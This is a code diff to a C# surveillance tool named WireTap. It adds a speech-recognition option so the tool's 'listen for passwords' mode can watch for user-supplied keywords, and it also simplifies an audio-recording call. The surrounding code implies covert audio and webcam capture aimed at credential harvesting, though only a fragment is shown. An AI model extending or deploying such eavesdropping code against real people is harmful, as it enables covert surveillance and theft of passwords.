@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Speech.Recognition;
 
 namespace WireTap
 {
@@ -76,9 +77,7 @@ namespace WireTap
                 {
                     recordTime = Helpers.ParseTimerString(args[1]);
                 }
-                string tempFile = Helpers.CreateTempFileName(".wav");
-                Audio.RecordAudio(tempFile, recordTime);
-                Console.WriteLine("[+] Audio recording file located at: {0}", tempFile);
+                Audio.RecordAudio(recordTime);
             }
             else if (captureWebCam)
             {
@@ -97,7 +96,16 @@ namespace WireTap
             }
             else if (listenPassword)
             {
-                Audio.ListenForPasswords();
+                if (args.Length == 2)
+                {
+                    string[] words = args[1].Split(',');
+                    Choices ch = new Choices(words);
+                    Audio.ListenForPasswords(ch);
+                }
+                else
+                {
+                    Audio.ListenForPasswords();
+                }
             }
         }
     }
